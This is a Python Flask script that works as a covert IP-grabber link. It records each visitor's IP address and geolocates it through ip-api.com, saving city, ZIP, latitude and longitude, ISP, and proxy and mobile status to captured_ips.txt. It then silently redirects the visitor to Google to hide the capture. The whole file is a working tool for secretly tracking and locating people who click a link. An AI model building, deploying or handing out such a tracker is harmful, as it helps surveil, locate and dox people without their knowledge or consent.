from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

LOOKUP_URL = "http://ip-api.com/json/{}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile"

@app.route('/')
def grab_ip():
    try:
        # Get visitor IP
        xf_header = request.headers.get("X-Forwarded-For")

        if xf_header:
            ip = xf_header.split(",")[0].strip()
        else:
            ip = request.remote_addr

        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        info = {}

        try:
            response = requests.get(
                LOOKUP_URL.format(ip),
                timeout=5
            )

            data = response.json()

            if data.get("status") == "success":
                info = data
            else:
                info = {"message": data.get("message", "Lookup failed")}

        except Exception as lookup_error:
            info = {"message": str(lookup_error)}

        print(f"[+] {timestamp} - {ip}")

        with open("captured_ips.txt", "a", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"Timestamp : {timestamp}\n")
            f.write(f"IP Address: {ip}\n")

            if info.get("status") == "success":
                f.write(f"Country   : {info.get('country')}\n")
                f.write(f"Region    : {info.get('regionName')}\n")
                f.write(f"City      : {info.get('city')}\n")
                f.write(f"ZIP       : {info.get('zip')}\n")
                f.write(f"Timezone  : {info.get('timezone')}\n")
                f.write(f"Latitude  : {info.get('lat')}\n")
                f.write(f"Longitude : {info.get('lon')}\n")
                f.write(f"ISP       : {info.get('isp')}\n")
                f.write(f"Org       : {info.get('org')}\n")
                f.write(f"ASN       : {info.get('as')}\n")
                f.write(f"Mobile    : {info.get('mobile')}\n")
                f.write(f"Proxy     : {info.get('proxy')}\n")
                f.write(f"Hosting   : {info.get('hosting')}\n")
            else:
                f.write(f"Lookup Error: {info.get('message')}\n")

            f.write("\n")

    except Exception as e:
        print(f"[-] Error capturing IP: {e}")

    return redirect("https://www.google.com")
